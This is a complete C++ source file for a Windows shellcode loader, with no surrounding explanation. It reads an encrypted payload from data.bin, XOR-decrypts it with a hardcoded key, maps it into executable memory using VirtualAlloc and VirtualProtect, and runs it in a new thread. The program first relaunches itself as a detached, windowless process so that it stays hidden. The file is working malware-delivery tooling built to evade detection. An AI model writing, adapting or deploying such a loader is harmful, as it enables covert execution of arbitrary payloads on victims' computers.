#include "ShellcodeLoader.hpp"

const uint8_t XOR_KEY[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};
const size_t XOR_KEY_LEN = sizeof(XOR_KEY);

std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted)
{
    std::vector<uint8_t> decrypted(encrypted.size());
    
    for (size_t i = 0; i < encrypted.size(); i++)
    {
        uint8_t key_byte = XOR_KEY[i % XOR_KEY_LEN];
        decrypted[i] = encrypted[i] ^ key_byte;
    }
    
    return decrypted;
}

std::vector<uint8_t> load_encrypted_data()
{
    std::ifstream file("data.bin", std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        return std::vector<uint8_t>();
    }
    
    size_t file_size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> encrypted(file_size);
    file.read(reinterpret_cast<char*>(encrypted.data()), file_size);
    file.close();
    
    return encrypted;
}

void execute_payload()
{
    std::vector<uint8_t> encrypted = load_encrypted_data();
    if (encrypted.empty())
    {
        return;
    }
    
    std::vector<uint8_t> shellcode = decrypt_shellcode(encrypted);
    
    void* mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem)
    {
        return;
    }
    
    memcpy(mem, shellcode.data(), shellcode.size());
    
    DWORD old_protect = 0;
    VirtualProtect(mem, shellcode.size(), PAGE_EXECUTE_READ, &old_protect);
    
    HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (thread_handle)
    {
        WaitForSingleObject(thread_handle, INFINITE);
        CloseHandle(thread_handle);
    }
    
    while (true)
    {
        Sleep(10000);
    }
}

bool is_already_detached()
{
    LPSTR cmd_line = GetCommandLineA();
    return strstr(cmd_line, "--detached") != NULL;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (is_already_detached())
    {
        Sleep(2000);
        execute_payload();
    }
    else
    {
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        
        char cmd_line[MAX_PATH * 2];
        snprintf(cmd_line, sizeof(cmd_line), "\"%s\" --detached", exe_path);
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(STARTUPINFOA);
        
        PROCESS_INFORMATION pi = {0};
        
        BOOL result = CreateProcessA(
            NULL,
            cmd_line,
            NULL,
            NULL,
            FALSE,
            DETACHED_PROCESS | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );
        
        if (result)
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            ExitProcess(0);
        }
        else
        {
            return 1;
        }
    }
    
    return 0;
}
